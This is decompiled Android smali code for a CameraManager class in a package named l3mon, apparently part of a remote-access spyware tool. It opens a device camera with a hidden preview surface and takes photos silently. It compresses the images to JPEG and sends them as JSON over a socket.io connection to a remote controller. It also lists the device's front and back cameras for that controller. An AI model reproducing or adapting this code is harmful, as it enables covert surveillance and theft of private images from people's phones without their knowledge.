.class public Lcom/etechd/l3mon/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .line 26
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 27
    iput-object p1, p0, Lcom/etechd/l3mon/CameraManager;->context:Landroid/content/Context;

    .line 28
    return-void
.end method

.method static synthetic access$000(Lcom/etechd/l3mon/CameraManager;)V
    .locals 0
    .param p0, "x0"    # Lcom/etechd/l3mon/CameraManager;

    .line 20
    invoke-direct {p0}, Lcom/etechd/l3mon/CameraManager;->releaseCamera()V

    return-void
.end method

.method static synthetic access$100(Lcom/etechd/l3mon/CameraManager;[B)V
    .locals 0
    .param p0, "x0"    # Lcom/etechd/l3mon/CameraManager;
    .param p1, "x1"    # [B

    .line 20
    invoke-direct {p0, p1}, Lcom/etechd/l3mon/CameraManager;->sendPhoto([B)V

    return-void
.end method

.method private releaseCamera()V
    .locals 1

    .line 72
    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 73
    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    .line 74
    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 75
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    .line 77
    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 7
    .param p1, "data"    # [B

    .line 56
    :try_start_0
    array-length v0, p1

    const/4 v1, 0x0

    invoke-static {p1, v1, v0}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 57
    .local v0, "bitmap":Landroid/graphics/Bitmap;
    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 58
    .local v2, "bos":Ljava/io/ByteArrayOutputStream;
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x14

    invoke-virtual {v0, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 59
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 60
    .local v3, "object":Lorg/json/JSONObject;
    const-string v4, "image"

    const/4 v5, 0x1

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 61
    const-string v4, "buffer"

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v6

    invoke-virtual {v3, v4, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 62
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v4

    invoke-virtual {v4}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v4

    const-string v6, "0xCA"

    new-array v5, v5, [Ljava/lang/Object;

    aput-object v3, v5, v1

    invoke-virtual {v4, v6, v5}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 67
    nop

    .end local v0    # "bitmap":Landroid/graphics/Bitmap;
    .end local v2    # "bos":Ljava/io/ByteArrayOutputStream;
    .end local v3    # "object":Lorg/json/JSONObject;
    goto :goto_0

    .line 65
    :catch_0
    move-exception v0

    .line 66
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    .line 69
    .end local v0    # "e":Lorg/json/JSONException;
    :goto_0
    return-void
.end method


# virtual methods
.method public findCameraList()Lorg/json/JSONObject;
    .locals 11

    .line 81
    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "android.hardware.camera"

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    .line 82
    return-object v1

    .line 87
    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 88
    .local v0, "cameras":Lorg/json/JSONObject;
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    .line 89
    .local v2, "list":Lorg/json/JSONArray;
    const-string v3, "camList"

    const/4 v4, 0x1

    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 92
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    .line 93
    .local v3, "numberOfCameras":I
    const/4 v5, 0x0

    .local v5, "i":I
    :goto_0
    if-ge v5, v3, :cond_3

    .line 94
    new-instance v6, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v6}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 95
    .local v6, "info":Landroid/hardware/Camera$CameraInfo;
    invoke-static {v5, v6}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 96
    iget v7, v6, Landroid/hardware/Camera$CameraInfo;->facing:I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v8, "id"

    const-string v9, "name"

    if-ne v7, v4, :cond_1

    .line 97
    :try_start_1
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 98
    .local v7, "jo":Lorg/json/JSONObject;
    const-string v10, "Front"

    invoke-virtual {v7, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 99
    invoke-virtual {v7, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 100
    invoke-virtual {v2, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 101
    nop

    .end local v7    # "jo":Lorg/json/JSONObject;
    goto :goto_1

    .line 102
    :cond_1
    iget v7, v6, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v7, :cond_2

    .line 103
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 104
    .restart local v7    # "jo":Lorg/json/JSONObject;
    const-string v10, "Back"

    invoke-virtual {v7, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 105
    invoke-virtual {v7, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 106
    invoke-virtual {v2, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 107
    nop

    .end local v7    # "jo":Lorg/json/JSONObject;
    goto :goto_1

    .line 109
    :cond_2
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 110
    .restart local v7    # "jo":Lorg/json/JSONObject;
    const-string v10, "Other"

    invoke-virtual {v7, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 111
    invoke-virtual {v7, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 112
    invoke-virtual {v2, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 93
    .end local v6    # "info":Landroid/hardware/Camera$CameraInfo;
    .end local v7    # "jo":Lorg/json/JSONObject;
    :goto_1
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 116
    .end local v5    # "i":I
    :cond_3
    const-string v4, "list"

    invoke-virtual {v0, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    .line 117
    return-object v0

    .line 119
    .end local v0    # "cameras":Lorg/json/JSONObject;
    .end local v2    # "list":Lorg/json/JSONArray;
    .end local v3    # "numberOfCameras":I
    :catch_0
    move-exception v0

    .line 120
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    .line 123
    .end local v0    # "e":Lorg/json/JSONException;
    return-object v1
.end method

.method public startUp(I)V
    .locals 4
    .param p1, "cameraID"    # I

    .line 32
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    .line 33
    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    .line 34
    .local v0, "parameters":Landroid/hardware/Camera$Parameters;
    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 36
    :try_start_0
    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v2, Landroid/graphics/SurfaceTexture;

    const/4 v3, 0x0

    invoke-direct {v2, v3}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v1, v2}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 37
    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 40
    goto :goto_0

    .line 38
    :catch_0
    move-exception v1

    .line 39
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 42
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v2, Lcom/etechd/l3mon/CameraManager$1;

    invoke-direct {v2, p0}, Lcom/etechd/l3mon/CameraManager$1;-><init>(Lcom/etechd/l3mon/CameraManager;)V

    const/4 v3, 0x0

    invoke-virtual {v1, v3, v3, v2}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 49
    return-void
.end method
